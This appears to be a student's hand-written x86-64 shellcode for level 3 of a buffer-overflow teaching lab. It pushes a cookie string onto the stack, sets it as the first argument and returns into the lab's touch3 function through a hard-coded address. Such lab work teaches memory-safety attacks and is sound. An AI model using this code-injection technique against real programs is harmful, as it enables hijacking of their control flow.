# Hand-generated assembly code of the level 3 of part 1.
# Relocate my exploit code not to be replaced by code in "hexmatch".
sub $0x18, %rsp				# 0x5561dc78 - 0x18 = 0x5561dc60
pushq $0						# push the ternimal '\0' to the stack. It is at 0x5561dc60.
movabsq $0x3539623939376661, %rax 
pushq %rax				# The byte sequecne of  0x59b997fa. It is at 0x5561dc58.
mov $0x5561dc58, %rdi	# Move the address of the string of my cookie to the first argument, %rdi.
pushq $0x4018fa			# Push the address of touch3 to the top of the current stack. 
retq
